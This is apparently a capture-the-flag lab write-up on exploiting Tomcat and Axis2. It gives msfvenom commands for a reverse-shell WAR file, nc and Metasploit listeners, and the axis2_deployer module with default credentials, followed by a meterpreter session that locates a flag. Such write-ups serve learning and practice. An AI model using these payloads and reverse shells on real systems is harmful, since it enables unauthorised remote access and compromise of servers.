# cd699a_remote_exploitaion_1

Once we have access to a Tomcat server, we can exploit the host by uploading a malicious WAR file.

## the first solution
use msfvenom to generate a malicious WAR file.

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.7 LPORT=4444 -f war -o revshell.war
```

In our kali machine, we can start a nc listener.
```
nc -lvp 4444
```

Or in our kali machine, we can use metasploit to start a listener.
```
use exploit/multi/handler
set payload generic/shell_reverse_tcp
set LHOST 192.168.0.7
set LPORT 4444
exploit
```

## the second solution

use metasploit to attack axis2 

```
use exploit/multi/http/axis2_deployer
set RHOST 10.0.3.197
set RPORT 8282
set USERNAME admin
set PASSWORD axis2
set LHOST 192.168.0.7 
set LPORT 4444
makerc axis2.rc  # will dump all the commands you have entered to a file; The file can then be executed using the command resource.
expoit

meterpreter > sysinfo
meterpreter > shell
C:\>dir /s *flag{cd699* 
dir /s *flag{cd699* 
 Volume in drive C has no label.
 Volume Serial Number is 663E-AFDF

 Directory of C:\Windows\System32

10/06/2023  01:26 AM            97,449 flag{cd699af2578185e69fe13fb2ae009b4ac8a0c91f5fc5ec}.jpg
```

